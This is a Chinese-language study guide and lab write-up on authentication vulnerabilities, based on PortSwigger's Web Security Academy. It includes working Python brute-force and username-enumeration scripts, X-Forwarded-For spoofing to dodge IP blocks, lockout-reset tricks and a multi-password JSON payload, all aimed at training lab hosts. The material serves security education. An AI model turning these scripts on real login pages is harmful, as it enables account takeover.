# 身分驗證漏洞（Authentication Vulnerabilities）

By: 1PingSun

Ref: [https://portswigger.net/web-security/authentication](https://portswigger.net/web-security/authentication)

---

從概念上，身分驗證漏洞很好理解。但因為身分驗證和安全性直接存在明確的關係，因此相當重要。

身分驗證漏洞允許攻擊者取得敏感資料或敏感功能的權限。他們還公開了額外的攻擊面供利用，因此了解如何辨識和利用身分認證漏洞，並學習如何繞過常見的保護機制相當重要。

在這個章節中，將介紹：

* 網站常見的身分驗證機制
* 這些驗證機制潛在的漏洞
* 不同驗證機制固有的漏洞
* 由於操作不適當造成的典型漏洞
* 如何使自己的驗證機制盡可能的強壯

## 什麼是身分驗證？

身分驗證是一個驗證使用者或客戶端的過程。網站很有可能暴露給任何能夠連上網際網路的人。這使得強壯的身分驗證機制，成為網路安全不可或缺的元素。

以下有三種主要的身分驗證類型：

* Something you **know**：例如密碼或回答安全問題。有時也稱為「knowledge factors」。
* Something you **have**：這是物理的物件，例如手機號碼或安全 Token。有時也稱為「prossession factors」。
* Something you **are** or do：例如你的生物特徵或行為模式。有時也稱為「inheerence factors」。

身分驗證透過一系列技術驗證上述其中一個或多個因子（factor）。

### 身分驗證（Authentication）與授權（Authorization）有什麼區別？

身分驗證是驗證使用者是否是他們要求的身分的過程；授權涉及驗證使用者允許做哪些行為。

例如：身分驗證可以確定使用者 `Carlos123` 存取網頁時，存取者是否與創建此使用者為同一人。

一旦使用者 `Carlos123` 通過驗證，權限將決定他被授權可以做什麼。例如，他可能被授權可以存取其他使用者的個人資訊，或執行刪除其他使用者帳號等操作。

## 身分驗證漏洞是如何產生的？

身分驗證機制中大多數的漏洞是以下兩種之一產生的：

* 身分驗證機制脆弱，因為他無法充分的保護暴力攻擊。
* 邏輯缺陷或錯誤的程式撰寫允許攻擊者完全繞過身分驗證機制。有時也稱為「broken authentication」。

在許多 Web 開發領域，邏輯錯誤會導致網站出現意料之外的行為，這有可能導致安全問題。然而，身分驗證對安全相當重要，所以有缺陷的身分驗證邏輯會使安全問題暴露。

## 身分驗證漏洞會造成什麼影響？

身分驗證漏洞會造成很多影響。如果攻擊者繞過驗證或暴力破解取得其他使用者帳號，就能夠擁有被盜帳號者的所有資料和功能。如果攻擊者能夠入侵高權限的帳號（例如系統管理者），他將能夠控制整個應用，並有可能取得內部架構的權限。

即使只破壞了低權限的帳號，也會使攻擊者能夠存取他不應該擁有的資料，例如敏感的商業資訊。即使該帳號沒有權限存取任何敏感資料，仍然可能允許攻擊者存取其他頁面，從而提供更多攻擊面。通常高嚴重性的攻擊不可能從公開存取的頁面，但可能來自內部的頁面。

## 身分驗證機制漏洞

網站的身分驗證系統通常由多個不同的機制組成，其中可能出現漏洞。有些漏洞在所有情況下都適用，其他的則是透過提供的特定功能。

我們將更仔細研究以下常見的一些漏洞領域：

* 密碼登入的漏洞（password-based login）
* 多重驗證的漏洞（muti-factor authentication）
* 其他驗證機制的漏洞

很多 Labs 需要你列舉使用者名稱並暴力破解密碼。我們提供了[帳號](https://portswigger.net/web-security/authentication/auth-lab-usernames)及[密碼](https://portswigger.net/web-security/authentication/auth-lab-passwords)的字典檔，你需要使用這些字典檔來解決 Labs。

## 密碼登入的漏洞（password-based login）

對於採用基於密碼登錄流程的網站，用戶要麼自己註冊帳戶，要麼由管理員分配帳戶。此帳戶與唯一的用戶名和秘密密碼相關聯，用戶在登錄表單中輸入這些資訊來驗證身份。

在這種情況下，知道秘密密碼被視為用戶身份的充分證明。這意味著如果攻擊者能夠獲得或猜測其他用戶的登錄憑證，網站的安全性就會受到損害。

這可以透過多種方式實現。以下章節展示攻擊者如何使用暴力破解攻擊，以及暴力破解防護中的一些缺陷。你還將了解 HTTP 基本身份驗證中的漏洞。

### 暴力破解攻擊

暴力破解攻擊是指攻擊者使用試錯系統來猜測有效的用戶憑證。這些攻擊通常使用用戶名和密碼的詞彙表進行自動化。將此過程自動化，特別是使用專用工具，可能使攻擊者能夠高速進行大量登錄嘗試。

暴力破解並不總是完全隨機地猜測用戶名和密碼。透過使用基本邏輯或公開可用的知識，攻擊者可以調整暴力破解攻擊，做出更有根據的猜測。這大大提高了此類攻擊的效率。如果網站僅依賴基於密碼的登錄作為驗證用戶身份的唯一方法，而沒有實施足夠的暴力破解防護，就可能高度脆弱。

#### 暴力破解用戶名

如果用戶名符合可識別的模式（例如電子郵件地址），則特別容易猜測。例如，以 firstname.lastname@somecompany.com 格式的商業登錄非常常見。然而，即使沒有明顯的模式，有時甚至高權限帳戶也會使用可預測的用戶名創建，例如 admin 或 administrator。

在審計期間，檢查網站是否公開披露潛在的用戶名。例如，你是否能夠在不登錄的情況下訪問用戶配置文件？即使配置文件的實際內容被隱藏，配置文件中使用的名稱有時與登錄用戶名相同。你還應該檢查 HTTP 回應，看是否披露了任何電子郵件地址。有時，回應包含高權限用戶（例如管理員或 IT 支援）的電子郵件地址。

#### 暴力破解密碼

密碼同樣可以被暴力破解，難度因密碼強度而異。許多網站採用某種形式的密碼政策，強制用戶創建高熵密碼，理論上至少更難僅用暴力破解來破解。這通常涉及強制執行具有以下條件的密碼：

- 最小字符數
- 大小寫字母的混合
- 至少一個特殊字符

然而，雖然高熵密碼對於單純的計算機來說很難破解，我們可以利用對人類行為的基本了解來利用用戶無意中引入此系統的漏洞。用戶通常不會創建具有隨機字符組合的強密碼，而是採用他們能記住的密碼，並試圖強行使其符合密碼政策。例如，如果不允許使用 mypassword，用戶可能會嘗試 Mypassword1! 或 Myp4$$w0rd 之類的替代方案。

在政策要求用戶定期更改密碼的情況下，用戶通常只對其首選密碼進行小幅、可預測的更改。例如，Mypassword1! 變成 Mypassword1? 或 Mypassword2!。

這種對可能憑證和可預測模式的了解意味著暴力破解攻擊通常可以比簡單地遍歷每個可能的字符組合更加複雜，因此更加有效。

#### 用戶名枚舉

用戶名枚舉是指攻擊者能夠觀察網站行為的變化，以識別給定的用戶名是否有效。

用戶名枚舉通常發生在登錄頁面（例如，當你輸入有效用戶名但密碼不正確時）或註冊表單（當你輸入已被占用的用戶名時）。這大大減少了暴力破解登錄所需的時間和精力，因為攻擊者能夠快速生成有效用戶名的簡短清單。

在嘗試暴力破解登錄頁面時，你應該特別注意以下方面的任何差異：

* **狀態碼**：在暴力破解攻擊期間，返回的 HTTP 狀態碼對於絕大多數猜測可能是相同的，因為大多數都是錯誤的。如果某個猜測返回不同的狀態碼，這強烈表明用戶名是正確的。網站的最佳做法是無論結果如何都始終返回相同的狀態碼，但這種做法並不總是被遵循。

* **錯誤訊息**：有時返回的錯誤訊息會根據用戶名和密碼是否都不正確，或者只有密碼不正確而有所不同。網站的最佳做法是在兩種情況下都使用相同的通用訊息，但有時會出現小的打字錯誤。即使在字符在渲染頁面上不可見的情況下，僅一個字符的位置錯誤就會使兩個訊息截然不同。

* **回應時間**：如果大多數請求都以相似的回應時間處理，任何偏離此時間的請求都表明幕後發生了不同的事情。這是猜測的用戶名可能正確的另一個指示。例如，網站可能只有在用戶名有效時才檢查密碼是否正確。這個額外步驟可能導致回應時間略微增加。這可能很微妙，但攻擊者可以透過輸入過長的密碼使網站需要明顯更長時間處理，從而使這種延遲更加明顯。

::: tip **Lab: [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)**
1. 寫程式爆破帳號和密碼：
    ```Python:line-numbers
    import requests

    def init():
        global cookies, headers, data
        cookies = {
            'session': 'H1Uhv8fuWXoes5VysCN1ORMv2Nc42qj9',
        }

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
            'sec-ch-ua': '"Not.A/Brand";v="99", "Chromium";v="136"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
            # 'cookie': 'session=H1Uhv8fuWXoes5VysCN1ORMv2Nc42qj9',
        }

        data = {
            'username': '1322',
            'password': '123123',
        }

    def enum_username():
        with open('username.txt', 'r') as f:
            usernames = f.readlines()
            for i in usernames:
                data = {
                    'username': i.strip(),
                    'password': '123',
                }

                response = requests.post(
                    'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
                    cookies=cookies,
                    headers=headers,
                    data=data,
                )
                
                print(f'\rTrying username: {i.strip()}        ', end='')

                if 'Invalid username' not in response.text:
                    print(f'\nFound username: {i.strip()}')
                    break

    def enum_password():
        with open('password.txt', 'r') as f:
            passwords = f.readlines()
            for i in passwords:
                data = {
                    'username': 'ansible',
                    'password': i.strip(),
                }

                response = requests.post(
                    'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
                    cookies=cookies,
                    headers=headers,
                    data=data,
                )
                
                print(f'\rTrying password: {i.strip()}              ', end='')

                if 'Incorrect password' not in response.text:
                    print(f'\nFound password: {i.strip()}')
                    break

    if __name__ == '__main__':
        init()
        enum_password()
    ```
2. 取得正確帳號為 `ansible`，密碼為 `michelle`，登入後即完成 Lab。
:::

::: tip **Lab: [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)**

1. 嘗試任意登入，發現回應 `Invalid username or password.`
2. 使用 Burp 的 Intruder 枚舉使用者名稱，觀察回應的差異，發現在枚舉到使用者 `auth` 的時候，回應為 `Invalid username or password`，其少了一個句點（`.`）。
3. 猜測存在使用者 `auth`
4. 使用使用者 `auth` 枚舉使用者的密碼，在枚舉到密碼 `777777` 的時候，回應中沒有 `Invalid username or password`。
5. 使用使用者名稱、密碼：`auth`/`777777` 登入通過此 Lab。
:::

::: tip Lab: [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)

1. 嘗試輸入任意帳號密碼，回應 `Invalid username or password.`
2. 嘗試多次登入後發現 `You have made too many incorrect login attempts. Please try again in 30 minute(s).`
3. 透過修改 HTTP header `X-Forwarded-For` 繞過
4. 嘗試透過判斷回應時間枚舉出帳號，在此 Lab 中，需枚舉兩個欄位，分別是 `X-Forwared-For` 的 IP，以及使用者名稱。另外，密碼欄位需要使用很長的長度，以增加回應時間的差異性。由於此 Lab 需枚舉兩個欄位，只有專業版的 Burp Suite 才能做到，所以只好自己寫 Exploit。
5. 枚舉帳號密碼的 Exploit 如下：
   :::code-group

    ```Python:line-numbers [enum-username.py]
    #!/usr/bin/python
    import requests

    cookies = {
        'session': 'your-session-cookie',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://your-lab-subdomain.web-security-academy.net',
        'priority': 'u=0, i',
        'referer': 'https://your-lab-subdomain.web-security-academy.net/login',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'X-Forwarded-For': '8.8.8.8',
    }

    data = {
        'username': 'wiener',
        'password': 'peter'*200,
    }

    response = requests.post(
        'https://your-lab-subdomain.web-security-academy.net/login',
        cookies=cookies,
        headers=headers,
        data=data,
        verify=False,
    )

    usernames = open('usernames.txt', 'r').read().splitlines()
    passwords = open('passwords.txt', 'r').read().splitlines()
    output = open('output.csv', 'w')

    for i in range(0, len(usernames)):
        headers['X-Forwarded-For'] = f'8.{i}.{i}.{i}'
        data['username'] = usernames[i]

        response = requests.post(
            'https://your-lab-subdomain.web-security-academy.net/login',
            cookies=cookies,
            headers=headers,
            data=data,
            verify=False,
        )
        
        output.write(f'{usernames[i]},{response.status_code},{response.elapsed}\n')
    ```

    ```Python:line-numbers [enum-password.py]
    # !/usr/bin/python
    import requests

    cookies = {
        'session': 'your-session-cookie',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://your-lab-subdomain.web-security-academy.net',
        'priority': 'u=0, i',
        'referer': 'https://your-lab-subdomain.web-security-academy.net/login',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'X-Forwarded-For': '8.8.8.8',
    }

    data = {
        'username': 'mysql',
        'password': 'peter'*200,
    }

    response = requests.post(
        'https://your-lab-subdomain.web-security-academy.net/login',
        cookies=cookies,
        headers=headers,
        data=data,
        verify=False,
    )

    usernames = open('usernames.txt', 'r').read().splitlines()
    passwords = open('passwords.txt', 'r').read().splitlines()

    for i in range(0, len(passwords)):
        headers['X-Forwarded-For'] = f'8.{i}.{i}.{i}'
        data['password'] = passwords[i]

        response = requests.post(
            'https://your-lab-subdomain.web-security-academy.net/login',
            cookies=cookies,
            headers=headers,
            data=data,
            verify=False,
        )

        if 'Invalid username or password.' not in response.text:
            print(f'Found valid credentials: {data['username']}:{passwords[i]}')
            break
    ```
    :::
6. 經過枚舉後取得帳號密碼為 `mysq`l/`freedom`，通過此 Lab。
:::

### 有缺陷的暴力破解防護

暴力破解攻擊在成功入侵帳戶之前，極有可能涉及許多次失敗的猜測。從邏輯上來說，暴力破解防護的核心在於盡可能讓自動化過程變得困難，並減慢攻擊者嘗試登入的速度。防止暴力破解攻擊最常見的兩種方式是：

* 如果遠端使用者進行過多次失敗的登入嘗試，則鎖定該使用者試圖存取的帳戶
* 如果遠端使用者在短時間內進行過多次登入嘗試，則封鎖該使用者的 IP 位址

這兩種方法都能提供不同程度的保護，但都不是無懈可擊的，特別是在使用有缺陷的邏輯實作時。

例如，您有時可能會發現，如果登入失敗次數過多，您的 IP 位址會被封鎖。在某些實作中，如果該 IP 位址的擁有者成功登入，失敗嘗試次數的計數器就會重設。這意味著攻擊者只需要每隔幾次嘗試就登入自己的帳戶，就能防止達到這個限制。

在這種情況下，只要在字典檔中定期加入您自己的登入憑證，就足以讓這種防護機制幾乎形同虛設。

::: tip Lab: [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)

1. 寫 exploit 每嘗試兩次請求就登入一組正確的帳號密碼，直到嘗試到正確的密碼就完成此 Lab 了
    ```python
    import requests

    def create_payload():
        wordlist = """123456
    password
    12345678

    ...put your passwords wordlist here...

    montana
    moon
    moscow""".split('\n')

        payload = []

        index = 0
        while (True):
            if index % 2 == 0:
                payload.append({
                    'username': 'wiener',
                    'password': 'peter'
                })
            payload.append({
                'username': 'carlos',
                'password': wordlist[index]
            })
            index += 1
            if index >= len(wordlist):
                break

        return payload

    def send_payload(payload):
        url = "https://0ad8002a034cd53c81d8bbea00ef00b5.web-security-academy.net/login"
        cookies = {
            'session': '0bDH2G8KDHX08wQ9oeMntk29hF50QcUe',
        }
        for data in payload:
            re = requests.post(url, data=data, cookies=cookies)
            print(f"\rTrying payload: {data}, Status: {re.status_code}{" " * 20}", end="")
            if "Incorrect password" not in re.text and "wiener" not in data['username']:
                print(f"\nFound valid credential: {data}")
                return

    if __name__ == "__main__":
        payload = create_payload()
        send_payload(payload)
    ```
:::

#### 帳戶鎖定

網站嘗試防止暴力破解的其中一種方式，就是在符合特定可疑條件時鎖定帳戶，通常是達到設定的登入失敗嘗試次數。就像一般的登入錯誤一樣，伺服器回應顯示帳戶已被鎖定的訊息，也可能協助攻擊者列舉使用者名稱。

::: tip Lab: [Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)

1. 寫程式對每個使用者名稱請求五次，並請 AI 改寫成非同步增加速度：
    ```python
    import asyncio
    import aiohttp
    from typing import List

    wordlist = """carlos
    root
    admin

    ...put the usernames here...

    auto
    autodiscover""".split('\n')


    async def test_login(session: aiohttp.ClientSession, username: str, url: str) -> None:
        """測試單一用戶名登入"""
        data = {
            'username': username,
            'password': 'test',
        }
        
        try:
            async with session.post(url, data=data) as response:
                text = await response.text()
                print(f"User: {username}\tStatus: {response.status}\tlength: {len(text)}")
        except Exception as e:
            print(f"User: {username}\tError: {e}")


    async def run_tests(wordlist: List[str], url: str, rounds: int = 5) -> None:
        """執行非同步測試"""
        # 設定連接池和超時
        timeout = aiohttp.ClientTimeout(total=10)
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            tasks = []
            
            # 建立所有任務
            for round_num in range(rounds):
                print(f"\n--- Round {round_num + 1} ---")
                for username in wordlist:
                    task = test_login(session, username, url)
                    tasks.append(task)
            
            # 並發執行所有任務，但限制同時執行的數量
            semaphore = asyncio.Semaphore(20)  # 限制同時最多20個請求
            
            async def limited_task(task):
                async with semaphore:
                    await task
            
            # 執行所有任務
            await asyncio.gather(*[limited_task(task) for task in tasks])


    async def main():
        """主函數"""
        url = 'https://0a45005d0321c863814516e700cb0001.web-security-academy.net/login'
        await run_tests(wordlist, url, rounds=5)


    if __name__ == "__main__":
        # 執行非同步程式
        asyncio.run(main())
    ```
2. 發現使用者名稱 `agenda` 的回應長度不同，猜測存在使用者名稱 `agenda`
3. 撰寫程式嘗試各種密碼，並請 AI 改寫成非同步增加速度：
    ```python
    import asyncio
    import aiohttp
    from typing import List

    wordlist = """123456
    password
    12345678
    
    ...put the passwords here...

    moon
    moscow""".split('\n')


    async def test_password(session: aiohttp.ClientSession, password: str, url: str, username: str = 'agenda') -> None:
        """測試單一密碼登入"""
        data = {
            'username': username,
            'password': password,
        }
        
        try:
            async with session.post(url, data=data) as response:
                text = await response.text()
                status = response.status
                length = len(text)
                
                print(f"Password: {password}\tStatus: {status}\tLength: {length}")
                            
        except Exception as e:
            print(f"Password: {password}\tError: {e}")

    async def run_password_tests(wordlist: List[str], url: str, rounds: int = 5, username: str = 'agenda') -> None:
        """執行非同步密碼測試"""
        # 設定連接池和超時
        timeout = aiohttp.ClientTimeout(total=15)
        connector = aiohttp.TCPConnector(
            limit=30,           # 總連接池大小
            limit_per_host=15,  # 每個主機的連接限制
            ttl_dns_cache=300,  # DNS快取時間
            use_dns_cache=True,
        )
        
        async with aiohttp.ClientSession(
            timeout=timeout, 
            connector=connector,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        ) as session:
            
            for round_num in range(rounds):
                print(f"\n=== Round {round_num + 1} ===")
                
                # 建立該輪的所有任務
                tasks = []
                for password in wordlist:
                    task = test_password(session, password, url, username)
                    tasks.append(task)
                
                # 使用信號量限制並發數
                semaphore = asyncio.Semaphore(10)  # 同時最多10個請求
                
                async def limited_task(task):
                    async with semaphore:
                        await task
                        # 小延遲避免過快請求
                        await asyncio.sleep(0.1)
                
                # 執行該輪所有任務
                await asyncio.gather(*[limited_task(task) for task in tasks])
                
                print(f"Round {round_num + 1} completed")


    async def main():
        """主函數"""
        url = 'https://0a45005d0321c863814516e700cb0001.web-security-academy.net/login'
        username = 'agenda'
        
        print(f"開始測試用戶 '{username}' 的密碼...")
        print(f"總共將測試 {len(wordlist)} 個密碼，執行 5 輪")
        
        await run_password_tests(wordlist, url, rounds=5, username=username)


    if __name__ == "__main__":
        # 執行非同步程式
        asyncio.run(main())
4. 找到密碼 `summer` 的回應長度和其他回應長度不同。
5. 等待一分鐘解除鎖定後，登入取得的帳號密碼完成此 Lab。
:::

鎖定帳戶對於針對特定帳戶的目標式暴力破解攻擊提供了一定程度的保護。然而，這種方法無法充分防止攻擊者只是試圖取得任何隨機帳戶存取權限的暴力破解攻擊。

例如，可以使用以下方法來繞過這種防護：

1. 建立一份可能有效的候選使用者名稱清單。這可以透過使用者名稱列舉，或者簡單地基於常見使用者名稱清單來達成。
2. 決定一個非常少量的密碼候選清單，您認為至少有一個使用者可能會使用。關鍵在於，您選擇的密碼數量不得超過允許的登入嘗試次數。例如，如果您已經確定限制為 3 次嘗試，您最多只能選擇 3 個密碼猜測。
3. 使用諸如 Burp Intruder 之類的工具，對每個候選使用者名稱嘗試每個選定的密碼。透過這種方式，您可以嘗試對每個帳戶進行暴力破解而不會觸發帳戶鎖定。您只需要一個使用者使用這三個密碼中的其中一個，就能成功入侵帳戶。

帳戶鎖定也無法防護憑證填充攻擊。這種攻擊涉及使用大量的「使用者名稱：密碼」配對字典，由在資料外洩事件中竊取的真實登入憑證組成。憑證填充攻擊利用了許多人在多個網站上重複使用相同使用者名稱和密碼的事實，因此字典中的某些被入侵憑證也有可能在目標網站上有效。帳戶鎖定無法防護憑證填充攻擊，因為每個使用者名稱只會被嘗試一次。憑證填充攻擊特別危險，因為它有時可以讓攻擊者僅透過一次自動化攻擊就入侵許多不同的帳戶。

#### 使用者速率限制

網站嘗試防止暴力破解攻擊的另一種方式是透過使用者速率限制。在這種情況下，在短時間內進行過多的登入請求會導致您的 IP 位址被封鎖。通常，IP 位址只能透過以下其中一種方式解除封鎖：

* 在經過一定時間後自動解除
* 由管理員手動解除
* 由使用者在成功完成驗證碼（CAPTCHA）後手動解除

由於使用者速率限制較不容易出現使用者名稱列舉和拒絕服務攻擊，因此有時會優於帳戶鎖定。然而，它仍然不是完全安全的。正如我們在之前的實驗中看到的例子，攻擊者有幾種方法可以操縱其表面 IP 位址來繞過封鎖。

由於限制是基於從使用者 IP 位址發送的 HTTP 請求速率，如果您能夠找出如何透過單一請求猜測多個密碼的方法，有時也可能繞過這種防護機制。

::: tip Lab: [Broken brute-force protection, multiple credentials per request](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)

1. 使用使用者名稱 `carlos` 及任意使用者名稱登入。
2. 透過 Burp Suite 的 Repeater 修改請求。
3. 請求為 Json 格式，將 `password` 欄位放入所有的密碼。
    ```json
    {
        "username" : "carlos",
        "password" : [
            "123456",
            "password",
            "qwerty"
            ...
            ]
    }
    ```
4. 請求回應 302，在回應上方點擊右鍵選擇「Show response in browser」成功登入完成此 Lab。
:::

### HTTP 基本驗證

雖然 HTTP 基本驗證相當古老，但由於其相對簡單和易於實作的特性，您有時仍會看到它被使用。在 HTTP 基本驗證中，客戶端從伺服器接收一個驗證權杖，該權杖是透過串聯使用者名稱和密碼，並使用 Base64 編碼而建構的。這個權杖由瀏覽器儲存和管理，瀏覽器會自動將其加入到後續每個請求的 `Authorization` 標頭中，如下所示：

```http
Authorization: Basic base64(username:password)
```

基於多種原因，這通常不被認為是安全的驗證方法。首先，它涉及在每個請求中重複發送使用者的登入憑證。除非網站同時實作 HSTS，否則使用者憑證容易在中間人攻擊中被擷取。

此外，HTTP 基本驗證的實作通常不支援暴力破解防護。由於權杖完全由靜態值組成，這可能使其容易遭受暴力破解攻擊。

HTTP 基本驗證對於工作階段相關的漏洞也特別脆弱，尤其是 CSRF，它本身無法提供任何防護。

在某些情況下，利用有漏洞的 HTTP 基本驗證可能只會讓攻擊者存取看似無趣的頁面。然而，除了提供進一步的攻擊面之外，以這種方式暴露的憑證可能會在其他更機密的環境中被重複使用。

## 多重要素驗證機制的漏洞（multi-factor authentication, MFA）

在本節中，我們將探討多重要素驗證機制中可能出現的一些漏洞。我們也提供了數個互動式實驗來示範如何利用多重要素驗證中的這些漏洞。

許多網站完全依賴使用密碼的單一要素驗證來驗證使用者身分。然而，有些網站要求使用者使用多個驗證要素來證明其身分。

對大多數網站而言，驗證生物特徵要素並不實際。然而，基於**您所知道的**和**您所擁有的**雙重要素驗證（2FA）越來越常見，無論是強制性或選擇性的。這通常要求使用者輸入傳統密碼和來自其持有的頻外實體裝置的臨時驗證碼。

雖然攻擊者有時可能取得單一知識型要素（如密碼），但同時從頻外來源取得另一個要素的可能性要低得多。基於這個原因，雙重要素驗證明顯比單一要素驗證更安全。然而，就像任何安全措施一樣，它的安全性只取決於其實作方式。實作不良的雙重要素驗證可能被破解，甚至完全被繞過，就像單一要素驗證一樣。

同樣值得注意的是，只有透過驗證多個**不同**要素，才能獲得多重要素驗證的完整效益。以兩種不同方式驗證相同要素並非真正的雙重要素驗證。基於電子郵件的 2FA 就是一個例子。雖然使用者必須提供密碼和驗證碼，但存取驗證碼只需要他們知道電子郵件帳戶的登入憑證。因此，知識驗證要素只是被驗證了兩次。

### 雙重要素驗證權杖

驗證碼通常由使用者從某種實體裝置上讀取。許多高安全性網站現在為使用者提供專用裝置，例如您可能用來存取網路銀行或工作筆電的 RSA 權杖或按鍵裝置。除了專為安全性而設計外，這些專用裝置還具有直接產生驗證碼的優勢。網站使用專用的行動應用程式（如 Google Authenticator）也很常見，原因相同。

另一方面，有些網站會透過簡訊將驗證碼發送到使用者的行動電話。雖然這在技術上仍然是驗證「您所擁有的」要素，但容易遭到濫用。首先，驗證碼是透過 SMS 傳輸，而不是由裝置本身產生。這為驗證碼被攔截創造了可能性。還有 SIM 卡調換的風險，攻擊者會詐欺性地取得帶有受害者電話號碼的 SIM 卡。攻擊者接著會收到所有發送給受害者的 SMS 簡訊，包括包含驗證碼的簡訊。

### 繞過雙重要素驗證

有時，雙重要素驗證的實作存在缺陷，嚴重到可以被完全繞過。

如果使用者首先被提示輸入密碼，然後在另一個頁面上被提示輸入驗證碼，那麼使用者在輸入驗證碼之前實際上已經處於「已登入」狀態。在這種情況下，值得測試是否可以在完成第一個驗證步驟後直接跳到「僅限已登入」的頁面。偶爾，您會發現網站在載入頁面之前實際上並未檢查您是否完成了第二個步驟。

## 第三方身分驗證機制的漏洞

如果你很喜歡破解身分驗證機制並且已經完成所有身分驗證的題目，你可能會像嘗試 OAuth 身分驗證的 Labs。

::: info Read more
[OAuth authentication](https://portswigger.net/web-security/oauth)
:::

## 防止對你自己的身分驗證機制的攻擊

我們已經展示了網站因實施身份驗證的方式而可能存在漏洞的幾種方式。為了降低你自己的網站遭受此類攻擊的風險，應該嘗試遵守幾項原則。

::: info Read more

* [如何使身分驗證機制安全](https://portswigger.net/web-security/authentication/securing)
:::
